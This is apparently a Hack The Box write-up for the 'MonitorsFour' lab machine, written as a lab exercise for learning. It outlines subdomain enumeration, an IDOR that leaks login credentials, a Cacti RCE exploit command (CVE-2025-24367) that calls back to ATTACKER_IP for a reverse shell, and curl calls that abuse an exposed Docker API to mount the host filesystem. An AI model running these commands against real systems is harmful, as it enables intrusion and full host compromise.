# Hack The Box --- MonitorsFour Writeup

![Completion Screenshot](monitorsfour_completion.png)

------------------------------------------------------------------------

## 🧠 Machine Information

  Field             Value
  ----------------- ---------------------------------
  Machine Name      MonitorsFour
  Platform          Hack The Box
  OS                Windows Host / Docker Container
  Difficulty        Medium
  Points            30
  Completion Date   17 Feb 2026
  Player            Berserker8

------------------------------------------------------------------------

# Executive Summary

This machine demonstrates a full modern attack chain including:

-   Subdomain enumeration
-   IDOR exploitation
-   Credential harvesting
-   CVE exploitation (Cacti RCE)
-   Docker container compromise
-   Docker API exploitation
-   Host filesystem mounting
-   Full host compromise

------------------------------------------------------------------------

# Attack Chain Overview

    Recon
     → Subdomain discovery
     → IDOR exploitation
     → Credential extraction
     → Login to Cacti
     → CVE‑2025‑24367 exploitation
     → Container shell
     → Docker API discovery
     → Docker escape
     → Host compromise

------------------------------------------------------------------------

# Phase 1 --- Enumeration

## Port Scan

``` bash
nmap -sC -sV -p- TARGET_IP
```

Discovered:

    80/tcp HTTP
    5985/tcp WinRM

------------------------------------------------------------------------

# Phase 2 --- Subdomain Discovery

``` bash
ffuf -w subdomains.txt -u http://TARGET -H "Host: FUZZ.target.htb"
```

Found:

    cacti.target.htb

------------------------------------------------------------------------

# Phase 3 --- IDOR Exploitation

Endpoint:

    /user?token=0

Returned credentials.

------------------------------------------------------------------------

# Phase 4 --- Credential Access

Credentials obtained:

    marcus : wonderful1

------------------------------------------------------------------------

# Phase 5 --- Cacti RCE Exploit

Exploit CVE‑2025‑24367:

``` bash
python3 exploit.py -u marcus -p wonderful1 -url http://cacti.target.htb -i ATTACKER_IP -l PORT
```

Shell obtained:

    www-data

------------------------------------------------------------------------

# Phase 6 --- Container Enumeration

Confirmed Docker:

``` bash
hostname
cat /proc/1/cgroup
```

------------------------------------------------------------------------

# Phase 7 --- Docker API Discovery

Discovered Docker Desktop API:

    192.168.65.7:2375

Confirmed via:

``` bash
curl http://192.168.65.7:2375/version
```

------------------------------------------------------------------------

# Phase 8 --- Docker Escape

Created container mounting host filesystem:

``` bash
curl -X POST http://192.168.65.7:2375/containers/create
```

Started container:

``` bash
curl -X POST http://192.168.65.7:2375/containers/ID/start
```

Retrieved root flag:

``` bash
curl http://192.168.65.7:2375/containers/ID/logs?stdout=true
```

------------------------------------------------------------------------

# Root Access Achieved

Successfully compromised the host system.

------------------------------------------------------------------------

# Key Lessons Learned

-   Always enumerate subdomains
-   Always test IDOR
-   Always search CVEs
-   Always verify container context
-   Always test Docker escape
-   Always scan Docker Desktop subnet

------------------------------------------------------------------------

# Skills Demonstrated

-   Web exploitation
-   CVE exploitation
-   Docker escape
-   Windows host compromise
-   Full attack chain execution

------------------------------------------------------------------------

# Completion Proof

See screenshot above.

------------------------------------------------------------------------

# Author

Berserker8 Hack The Box Player 2026
